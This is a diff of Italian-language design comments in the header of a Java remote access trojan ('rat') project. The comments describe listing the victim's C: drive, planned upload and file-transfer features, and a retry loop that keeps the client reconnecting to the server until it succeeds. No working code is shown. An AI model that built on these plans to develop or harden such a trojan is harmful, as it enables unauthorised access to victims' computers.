@@ -7,11 +7,9 @@ package src;
  * per adesso ho aggiunto un nuovo thread con un propio flusso in/out
  * il flusso del thread è solo out dal client, e in dal server, (posso solo ricevere dal client).
  * La funzione non è ancora un file transfer vero e propio 
- * per adesso stampo solamente la directori c:// della vittima) .
- * 
- * e non viceversa , nelle successive versioni implementerò la funzione 
- * in out sia server che client 
- * cosi da poter anche usufruire della funzione di upoload
+ * , nelle successive versioni implementerò la funzione, 
+ * in out, sia server che client. 
+ * Cosi da poter anche usufruire della funzione di upoload
  * 
  * 
  * nelle versioni successive dovrò aggiungere la funzione 
@@ -19,6 +17,12 @@ package src;
  * shutdown ecc     //roba da lamer che penso non inserirò sinceramente!!
  * easy job
  * 
+ IMPORTANTE!!!!!
+ una csa che manca fondamentale per mettere il rat in funzione (in circolo)
+ è gestire l eccezzione dell errore uknownhostexception e fare in modo che contuinii a cercare il serer fino a chè
+ non stabilisce una connessione. ALTRIMENTI IL THREAD DEL CLIENT MUORE (PERCHE FINISCE IL SUO CICLO CON UN ERRORE)
+ l'unico modo secondo me è gestire l'errore creando un nuovo errore di quel tipo 
+ e fare un ciclo while sock.connection != true/false
  * 
  * vb.0.5
  * Aggiunto sistema login!
